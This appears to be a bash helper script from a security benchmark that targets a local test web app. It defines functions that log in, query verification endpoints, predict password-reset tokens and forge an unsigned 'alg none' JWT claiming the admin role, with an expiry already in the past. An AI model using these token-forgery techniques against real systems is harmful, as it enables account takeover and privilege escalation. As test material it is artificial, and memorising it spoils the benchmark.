#!/usr/bin/env bash
TARGET="${TARGET:-http://127.0.0.1:13311}"
VT="X-Verify-Token: ${VERIFY_TOKEN:-benchsecret}"
JAR="$(mktemp)"
cleanup() { rm -f "$JAR"; }
trap cleanup EXIT
json_ct='content-type: application/json'
login() { curl -s -c "$JAR" -X POST "$TARGET/api/auth/login" -H "$json_ct" -d "{\"email\":\"$1\",\"password\":\"$2\"}"; }
post_id() { curl -s -H "$VT" "$TARGET/api/_verify/post?slug=$1" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("id",""))'; }
user_id() { curl -s -H "$VT" "$TARGET/api/_verify/user?email=$1" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("id",""))'; }
predict_reset() { python3 -c 'import base64,sys; print(base64.urlsafe_b64encode((sys.argv[1]+":bench").encode()).rstrip(b"=").decode())' "$1"; }
forge_none_jwt() { python3 - <<'JWT_PY'
import base64,json,time
enc=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
print(enc({'alg':'none','typ':'JWT'})+'.'+enc({'sub':'1','role':'admin','exp':int(time.time())-3600})+'.')
JWT_PY
}
